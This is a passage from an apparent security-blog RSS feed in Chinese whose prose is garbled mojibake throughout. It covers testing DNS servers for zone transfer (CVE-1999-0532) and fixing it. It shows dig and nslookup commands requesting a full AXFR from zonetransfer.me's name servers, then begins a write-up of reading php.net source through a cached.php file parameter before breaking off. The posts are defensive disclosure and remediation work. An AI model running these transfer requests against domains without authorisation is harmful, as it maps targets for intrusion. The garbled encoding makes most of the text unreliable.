&lt;p&gt;åœ¨ Linux ç’°å¢ƒå…§ï¼Œæˆ‘å€‘å¯åˆ©ç”¨ &lt;a href=&quot;http://linux.vbird.org/linux_server/0350dns.php#dig&quot;&gt;dig&lt;/a&gt; æŒ‡ä»¤æŸ¥è©¢ç›®æ¨™ domain ä½¿ç”¨å“ªäº› name serverï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig +nostats +nocomments +nocmd NS zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server æŸ¥è©¢çµæœï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;zonetransfer.me.		IN	NS
zonetransfer.me.	7118	IN	NS	ns12.zoneedit.com.
zonetransfer.me.	7118	IN	NS	ns16.zoneedit.com.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;å¾çµæœå¯å¾—çŸ¥æœ‰ ns12.zoneedit.com æˆ– ns16.zoneedit.com é€™å…©å€‹ DNS serverï¼Œæ¥è‘—æˆ‘å€‘å³å¯æ¸¬è©¦æ˜¯å¦å¯å¾å¤–éƒ¨ç¶²è·¯å°é€™å…©å€‹ DNS server é€²è¡Œ zone transferï¼Œæ¸¬è©¦æ–¹å¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Zone transfer æ¸¬è©¦çµæœï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; title=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/linux-zone-transfer-result.jpg&quot; alt=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; title=&quot;ä½¿ç”¨ dig æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¾ä¸Šé¢çš„æ¸¬è©¦çµæœä¸­æˆ‘å€‘å¯ç™¼ç¾ï¼Œzonetransfer.me é€™å€‹ç¶²åŸŸçš„æ‰€æœ‰ DNS è¨­å®šå·²å…¨éƒ¨è¢«åˆ—å‡ºã€‚&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;è‹¥æ˜¯åœ¨ Windows ç’°å¢ƒï¼Œå¯åœ¨å‘½ä»¤æç¤ºå­—å…ƒç’°å¢ƒå…§ä½¿ç”¨ &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; æŒ‡ä»¤æŸ¥è©¢ç›®æ¨™ domain ä½¿ç”¨å“ªäº› name serverï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Name server æŸ¥è©¢çµæœï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	nameserver &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;è¼¸å…¥æŒ‡ä»¤å¾Œæˆ‘å€‘å¦‚åŒå…ˆå‰ä½¿ç”¨ dig ä¸€æ¨£ï¼Œå¾—çŸ¥ç›®æ¨™æœ‰ ns12.zoneedit.com èˆ‡ ns16.zoneedit.com é€™å…©å€‹ name serverï¼Œæ¥è‘—å†å¦‚ä¸‹åœ–ä¾åºè¼¸å…¥ä¸‰é“æŒ‡ä»¤æŸ¥è©¢ï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;è¨»ï¼šLinux ç‰ˆçš„ nslookup æ²’æœ‰å¯¦ä½œ ls é€™å€‹åŠŸèƒ½å–”ï¼&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer æ¸¬è©¦çµæœï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; title=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-result.jpg&quot; alt=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; title=&quot;ä½¿ç”¨ nslookup æ¸¬è©¦ç¶²åŸŸæ˜¯å¦å­˜åœ¨ zone transfer æ¼æ´&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¸¬è©¦çµæœèˆ‡ Linux ç’°å¢ƒæ‰€å¾—åˆ°çš„è³‡æ–™é›·åŒï¼Œå¯æˆåŠŸåˆ—å‡ºè©²ç¶²åŸŸçš„æ‰€æœ‰ DNS è¨­å®šã€‚&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;ç•¶ç„¶ï¼Œä¸¦ä¸æ˜¯æ¯å€‹äººéƒ½ç†Ÿæ‚‰ä¸Šè¿°æŒ‡ä»¤çš„æ“ä½œæ–¹å¼ï¼Œå› æ­¤é™¤äº†ä»‹ç´¹æ‰‹å‹•æª¢æ¸¬æ–¹æ³•ä¹‹å¤–ï¼Œåœ¨é€™è£¡ä¹Ÿæä¾›å¹¾å€‹ç·šä¸Šæª¢æ¸¬çš„æœå‹™ï¼Œè®“å¤§å®¶å¯ä»¥è¿…é€Ÿæª¢æ¸¬è‡ªå®¶å…¬å¸æˆ–è€…ä½ æ­£åœ¨ä½¿ç”¨çš„æœå‹™æ˜¯å¦æœ‰æ­¤å•é¡Œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦éš›æ¡ˆä¾‹&quot;&gt;å¯¦éš›æ¡ˆä¾‹&lt;/h3&gt;

&lt;p&gt;å¦‚åŒä¸Šæ¬¡ &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers è³‡å®‰è­°é¡Œ&lt;/a&gt;æ‰€æ¢è¨çš„å°è±¡ï¼Œæˆ‘å€‘å¾ TIEA æˆå“¡ä»¥åŠ Alexa TW top 525 è§€å¯Ÿ zone transfer å•é¡Œåˆ†åˆ¥åœ¨é€™äº›æ—ç¾¤ä¸­ä½”æœ‰å¤šå°‘æ¯”ä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;æ ¹æ“šæˆ‘å€‘ç›£æ¸¬çš„çµæœï¼Œåœ¨ç›®å‰ TIEA çš„ 132 åæˆå“¡ä¸­ï¼Œæœ‰ 20 å€‹ç¶²åŸŸå­˜åœ¨ zone transfer å•é¡Œï¼Œä½”äº† 15.15%ã€‚è€Œåœ¨ Alexa TW top 525 ç•¶ä¸­ï¼Œæœ‰ 48 å€‹ç¶²åŸŸå­˜åœ¨ zone transfer å•é¡Œï¼Œä½”äº† 9.14%ã€‚ä¹çœ‹ä¹‹ä¸‹æ¯”ç‡ä¼¼ä¹ä¸é«˜ï¼Œä½†æ˜¯åœ¨ä¸Šè¿°å…©å€‹æ—ç¾¤çš„ç¶²åŸŸç•¶ä¸­ï¼ŒåŒ…æ‹¬ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;é›»ä¿¡å•†&lt;/li&gt;
  &lt;li&gt;å¤šå®¶é›»è¦–åª’é«”&lt;/li&gt;
  &lt;li&gt;å¤šå®¶ç¶²è·¯æ–°èåª’é«”&lt;/li&gt;
  &lt;li&gt;å¤šå®¶ç·šä¸Šè³¼ç‰©ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;çŸ¥ååœ˜è³¼ç¶²ç«™&lt;/li&gt;
  &lt;li&gt;çŸ¥åé‡‘æµå…¬å¸&lt;/li&gt;
  &lt;li&gt;çŸ¥åç·šä¸ŠéŸ³æ¨‚æœå‹™&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å°ç£ä¼æ¥­ä¸å¤ æ³¨é‡è³‡è¨Šå®‰å…¨ï¼Œç½”é¡§å®¢æˆ¶è³‡æ–™å®‰å…¨æ€§ï¼Œæ—©å·²ä¸æ˜¯æ–°èã€‚ç„¶è€Œè‹¥ä¼æ¥­ä¸é¡§è‡ªèº«å•†æ¥­åˆ©ç›Šèˆ‡è²¬ä»»ï¼Œç•¶å½¼æ­¤ç„¡å•†æ¥­å¾€ä¾†æ™‚ï¼Œæˆ‘å€‘ä¹Ÿç„¡æ³•ä¸€ä¸€å’è²¬ã€‚ä½†è‹¥é€£å°åŒ—å¸‚æ”¿åºœã€æ•™è‚²éƒ¨ã€å¤šé–“å¤§å°ˆé™¢æ ¡éƒ½æœ‰æ­¤å•é¡Œï¼Œå°±ä»¤äººä¸å¤ªèƒ½æ¥å—äº†ï¼Œé€™äº›æ”¿åºœå–®ä½èˆ‡æ•™è‚²æ©Ÿæ§‹ç†ç•¶ç‚ºæˆ‘å€‘çš„å€‹äººè³‡æ–™å®‰å…¨æ€§è² èµ·å…¨éƒ¨çš„è²¬ä»»ï¼Œä¸æ‡‰è©²æ¼æ‰ä»»ä½•ä¸€å€‹è³‡å®‰ç’°ç¯€ã€‚ä¸Šè¿°çµæœé¡¯ç¤ºå‡ºå°ç£å¾æ”¿åºœåˆ°ä¼æ¥­å¯èƒ½éƒ½æ²’æœ‰å¾¹åº•è½å¯¦ DNS çš„è³‡å®‰è¨­å®šï¼Œè€Œä¸”ç›®å‰çš„æ•¸æ“šåƒ…åƒ…æ˜¯é‡å° TIEA æˆå“¡ä»¥åŠ Alexa TW top 525 é€²è¡Œæª¢æ¸¬ï¼Œè‹¥æ˜¯å°å…¨å°ç£æˆ–æ˜¯å…¨ä¸–ç•Œé€²è¡Œå¤§ç¯„åœçš„æª¢æ¸¬ï¼Œææ€•æœƒç™¼ç¾æ›´å¤šé©šäººçš„æ¡ˆä¾‹ï¼&lt;/p&gt;

&lt;h3 id=&quot;å°ä¼æ¥­çš„æ½›åœ¨å½±éŸ¿&quot;&gt;å°ä¼æ¥­çš„æ½›åœ¨å½±éŸ¿&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼ç¶²åŸŸåç¨±&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬ä¼æ¥­åœ¨é€²è¡Œ&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;æ»²é€æ¸¬è©¦&lt;/a&gt;æ™‚ï¼Œé€šå¸¸åªæœƒæŒ‘å¹¾å€‹æœ€é‡è¦ã€æœ€å¸¸é¢å°å®¢æˆ¶çš„ç¶²åŸŸé€²è¡Œæ¸¬è©¦ï¼Œä½†æ˜¯å…¥ä¾µè€…å¯ä¸æœƒé€™éº¼ä¹–ã€‚ç•¶æœ‰äººå˜—è©¦è¦å…¥ä¾µä¼æ¥­æ™‚ï¼Œå¿…å®šæ˜¯å…ˆé€²è¡Œå…¨é¢çš„åµæŸ¥ï¼Œè§€å¯Ÿä¼æ¥­å“ªå¹¾å€‹ç¶²åŸŸæ‰€åŸ·è¡Œçš„ service æœ‰æ½›åœ¨çš„å¼±é»ï¼Œæˆ–æ˜¯çœ‹å“ªå¹¾å€‹ç¶²åŸŸé˜²ç¦¦åŠ›é“è¼ƒå¼±ï¼Œå†å¾è©²è™•ä¸‹æ‰‹ã€‚å› æ­¤ zone transfer å•é¡Œæ‰€æä¾›çš„å®Œæ•´ DNS è¨˜éŒ„ï¼Œå°±ç‚ºå…¥ä¾µè€…çœä¸‹äº†è¨±å¤šåµæŸ¥çš„å·¥å¤«ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼å¤–ç¶² IP ç¯„åœ&lt;/p&gt;

    &lt;p&gt;ç•¶æ”»æ“Šè€…å–å¾— zone transfer æ‰€æ´©æ¼çš„è³‡æ–™å¾Œï¼Œå¯åˆç†æ¨æ–·å“ªäº›ç¶²æ®µæ˜¯å±¬æ–¼è©²ä¼æ¥­ï¼Œé€²ä¸€æ­¥å°è©²ç¶²æ®µé€²è¡Œæƒæï¼Œå˜—è©¦æ‰¾å°‹æœ‰æ©Ÿæœƒå…¥ä¾µä¹‹æ¨™çš„ç‰©ã€‚&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æ´©æ¼å…§ç¶² IP ç¯„åœ&lt;/p&gt;

    &lt;p&gt;æœ‰äº›ç®¡ç†äººå“¡ã€é–‹ç™¼è€…ç‚ºæ±‚å…§éƒ¨é–‹ç™¼æ–¹ä¾¿ï¼Œç¶“å¸¸æœƒå°‡ç¶²åŸŸåç¨±è·Ÿå…§ç¶² IP ä½å€ç¶åœ¨ä¸€èµ·ï¼Œä¾‹å¦‚å°‡ phpmyadmin.example.com è¨­å®šç‚º 192.168.1.100ï¼Œæ”»æ“Šè€…å°±å¯æ ¹æ“šæ­¤é¡è³‡è¨ŠçŒœæ¸¬å…§ç¶²å“ªäº›ç¶²æ®µå­˜åœ¨é‡è¦æœå‹™ã€‚é€™ç¨®è¨­å®šå¹³å¸¸ä¹Ÿè¨±ä¸æœƒé€ æˆé‡å¤§æå®³ï¼Œä½†æ˜¯ç•¶ç®¡ç†è€…ç–æ–¼å»ºç«‹å…§ç¶²é˜²ç¦¦æ©Ÿåˆ¶ï¼Œæ°å¥½ä¼æ¥­åˆè¢«å…¥ä¾µè‡³å…§ç¶²æ™‚ï¼Œé€ æˆä¸€é€£ä¸²é‡å¤§æå¤±çš„æ©Ÿç‡å°‡æœƒå¤§å¹…æé«˜ã€‚&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è§£æ±ºæ–¹å¼&quot;&gt;è§£æ±ºæ–¹å¼&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;è‹¥ä½¿ç”¨ Linuxï¼Œå¯åœ¨ /etc/named.conf å…§åŠ å…¥ä¸‹åˆ—é¸é …ï¼Œä»¥é™åˆ¶å¯å­˜å– zone transfer çš„ä¾†æºï¼š&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;è¨­å®šå®Œç•¢å¾Œï¼Œå°‡ DNS æœå‹™é‡å•Ÿå³å¯ç”Ÿæ•ˆã€‚&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;åœ¨ Windows server ç•¶ä¸­ï¼Œæˆ‘å€‘å¯åˆ°ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ç›¸é—œè¨­å®šï¼Œå¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; title=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-1.png&quot; alt=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot; title=&quot;æ–¼ä¼ºæœå™¨ç®¡ç†å“¡ä¿®æ”¹ç¶²åŸŸçš„ zone transfer è¨­å®š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ä¼ºæœå™¨ç®¡ç†å“¡ä¸­ï¼Œé¸å®šæƒ³è¦ä¿®æ”¹çš„ç¶²åŸŸï¼ˆæ­¤è™•ä»¥ test.com ç‚ºä¾‹ï¼‰ï¼ŒæŒ‰å³éµé»é¸å…§å®¹ï¼Œå°‡æœƒè·³å‡ºé¸å–®å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; title=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140505/windows-zone-transfer-solution-2.png&quot; alt=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot; title=&quot;ä¿®æ”¹ test.com çš„ zone transfer è¨­å®š&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æ¥è‘—å°±æ˜¯è§€çœ‹ã€Œå…è¨±å€åŸŸè½‰é€ã€é¸é …æ˜¯å¦æœ‰å‹¾é¸ï¼Œè‹¥å·²å‹¾é¸ï¼Œå‰‡ç¢ºèªè½‰é€å°è±¡æ˜¯å¦ç‚ºä¸‹åˆ—å…©ç¨®ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;åªåˆ°åˆ—åœ¨ã€Œåç¨±ä¼ºæœå™¨ç´¢ã€å¼•æ¨™ç°½ä¸Šçš„ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;åªåˆ°ä¸‹åˆ—ä¼ºæœå™¨&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS åœ¨åš zone transfer æ™‚æ˜¯ä½¿ç”¨ TCP 53 portï¼ˆæœ‰åˆ¥æ–¼ä¸€èˆ¬ DNS query çš„ UDP 53 portï¼‰ï¼Œå› æ­¤æœ‰äº›äººæœƒèªç‚ºå°‡ TCP 53 port é—œé–‰å°±å¯ä»¥å°ä»˜ zone transferï¼Œè€Œä¸æƒ³ä¿®æ”¹ zone transfer çš„è¨­å®šã€‚å…¶å¯¦é€™å€‹è§€å¿µåªå°äº†ä¸€åŠï¼Œè‹¥ zone file çš„è³‡æ–™å°æ–¼ 512 byteï¼Œä»ç„¶å¯ä»¥é€é UDP å‚³è¼¸ã€‚å³ä½¿ zone file çš„è³‡æ–™å¤§æ–¼ 512 byteï¼Œ&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;ä¹Ÿå¯ä»¥ç”¨ Incremental Zone Transfer (IXFR) çš„æ–¹å¼å–å¾—éƒ¨åˆ†è³‡æ–™&lt;/a&gt;ã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;å¦‚æœä¼æ¥­ä»Šå¤©éå¸¸æœ‰è‡ªä¿¡èƒ½å¤ æ›¿æ‰€æœ‰ç¶²åŸŸéƒ½æº–å‚™å¥½å®Œå–„çš„å®‰å…¨æªæ–½ï¼Œé‚£éº¼ zone transfer æ‰€æ´©æ¼çš„è³‡æ–™å°è©²ä¼æ¥­å°±ä¸æœƒæœ‰å¤ªåš´é‡çš„å½±éŸ¿ã€‚ç„¶è€Œï¼Œåœ¨ç¾ä»Šé€™å€‹å…¥ä¾µæ‰‹æ³•æ—¥æ–°æœˆç•°çš„ä¸–ç•Œè£¡ï¼Œåˆæœ‰èª°èƒ½å¤ æ°¸é ä¿è­‰è‡ªå·±çš„å®‰å…¨é˜²è­·å·²ç¶“åšè¶³äº†å‘¢ï¼Ÿåœ¨å‰é™£å­ç«ç´…çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; å•é¡Œè¢«çˆ†å‡ºä¾†ä¹‹å¾Œï¼Œæˆ‘å€‘å°±è—‰ç”±è¨±å¤š zone transfer çš„è¨˜éŒ„è§€å¯Ÿåˆ°å…¨ä¸–ç•Œæœ‰éå¸¸å¤šä¼æ¥­åªä¿®å¾©äº†ä¸»è¦ç¶²ç«™çš„ OpenSSL æ¼æ´ï¼Œå»å¿½ç•¥äº†ä¼æ¥­å…§å…¶ä»–çš„æœå‹™èˆ‡è¨­å‚™å¯èƒ½ä¹Ÿæœ‰æ­¤æ¼æ´ï¼Œåƒæ˜¯ DBã€Emailã€VPNã€NAS ç­‰ç­‰ï¼Œç›´åˆ°ä»Šæ—¥ä»é²é²æœªä¿®å¾©ã€‚&lt;/p&gt;

&lt;p&gt;åƒè¬åˆ¥ä»¥ç‚ºä½ æ‰€è³¼è²·çš„å„ç¨®è³‡å®‰è¨­å‚™èƒ½é˜²ç¦¦æ‰€æœ‰è³‡å®‰å¼±é»ï¼Œä¹Ÿåˆ¥å¿½ç•¥äº†å„é …å¤è€çš„è³‡å®‰å¼±é»ï¼Œæ›´åˆ¥å°çœ‹äº†ä½ æ‰€ä¸ç†Ÿæ‚‰çš„é§­å®¢å€‘çš„çµ„åˆå„å¼å„æ¨£å¼±é»çš„èƒ½åŠ›ï¼Œåªè¦æœ‰ä¸€å€‹è³‡å®‰ç’°ç¯€ç–æ¼ï¼Œéš¨æ™‚éƒ½æœ‰å¯èƒ½å°ä¼æ¥­é€ æˆè‡´å‘½å±æ©Ÿã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/</link>
                <guid>https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue</guid>
                <pubDate>Mon, 05 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>PHP å®˜ç¶²åŸå§‹ç¢¼è®€å–æ¡ˆä¾‹</title>
                <description>&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;ä¸å®‰å…¨çš„å¼•ç”¨ç‰©ä»¶ (Insecure Direct Object Reference)&lt;/a&gt; æ˜¯å€‹éå¸¸å¸¸è¦‹çš„è³‡å®‰æ¼æ´ï¼Œåœ¨ &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; å…¬å¸ƒçš„&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;åå¤§ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å®‰å…¨æ¼æ´&lt;/a&gt; ä¸­é«˜å±…ç¬¬å››åã€‚é€šå¸¸ç™¼ç”Ÿåœ¨ç¶²ç«™æ‡‰ç”¨ç¨‹å¼ä¸Šæ²’æœ‰é‡å°è¼¸å…¥çš„åƒæ•¸åšå¥½æª¢æŸ¥ï¼Œå°±æŠŠåƒæ•¸ä¸Ÿå…¥ include æˆ– readfile ç­‰å‡½æ•¸ç•¶ä¸­å¼•ç”¨ï¼Œä½¿å¾—æ”»æ“Šè€…å¯ä»¥è—‰æ­¤å­˜å–ä»»æ„æ–‡ä»¶çš„åŸå§‹ç¢¼ã€‚&lt;/p&gt;

&lt;p&gt;ä»Šå¤©é€™å€‹æ¡ˆä¾‹å°±ç™¼ç”Ÿåœ¨ PHP çš„å®˜æ–¹ç¶²ç«™ (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)ï¼Œæ¶ˆæ¯ä¾†æºæ˜¯çŸ¥åçš„ 0-Day é»‘å¸‚ 1337dayï¼Œç™¼ä½ˆçš„æ—¥æœŸæ˜¯ 2014/4/4 ï¼ŒåŸå§‹çš„å…§å®¹æ˜¯é€™æ¨£çš„ï¼š&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day æ¼æ´äº¤æ˜“ç¶²ç«™&quot; title=&quot;1337day æ¼æ´äº¤æ˜“ç¶²ç«™&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥çœ‹åˆ°é€™å€‹å¼±é»æ˜¯ä¸å…¬é–‹çš„ï¼Œæƒ³è¦çŸ¥é“å…§å®¹çš„è©±è¦æ”¯ä»˜ 82 ç¾å…ƒç›¸ç•¶æ–¼æ–°å°å¹£ 3500 å…ƒå‘¢ï¼åœ¨å¼·çƒˆçš„å¥½å¥‡å¿ƒå±ˆä½¿ä¹‹ä¸‹ï¼Œè‡ªå·±æ‰“é–‹å·¥å…·ä¾†æ‰¾çœ‹çœ‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP å®˜æ–¹ç¶²ç«™åŸå§‹ç¢¼&quot; title=&quot;PHP å®˜æ–¹ç¶²ç«™åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é€éç°¡å–®çš„åˆ†æå’Œä¸€é»é»é‹æ°£ï¼Œæ‰¾åˆ°äº† ã€Œ&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;ã€ é€™éš»ç¨‹å¼ï¼Œç™¼ç¾å®ƒå‚³å…¥äº†ã€Œtã€å’Œã€Œfã€é€™å…©å€‹åƒæ•¸ã€‚ã€Œtã€ç›´è¦ºä¸Šå°±æ˜¯å€‹ rand æ•¸å€¼ï¼Œè€Œã€Œfã€æ‡‰è©²å°±æ˜¯æª”æ¡ˆä½ç½®äº†ã€‚é€™æ™‚å€™å° f åƒæ•¸å°å°ä¿®æ”¹ä¸€ä¸‹ï¼Œç¥å¥‡çš„äº‹æƒ…ç™¼ç”Ÿäº†ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php è®€å–åŸå§‹ç¢¼&quot; title=&quot;cached.php è®€å–åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php çš„åŸå§‹ç¢¼è¢«å®Œæ•´çš„è®€å‡ºä¾†ï¼Œç•¶ç„¶ä¹Ÿè¦ä¾†çœ‹ä¸€ä¸‹ cached.php æ˜¯æ€éº¼å¯«çš„ï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php æª¢è¦–åŸå§‹ç¢¼&quot; title=&quot;cached.php æª¢è¦–åŸå§‹ç¢¼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

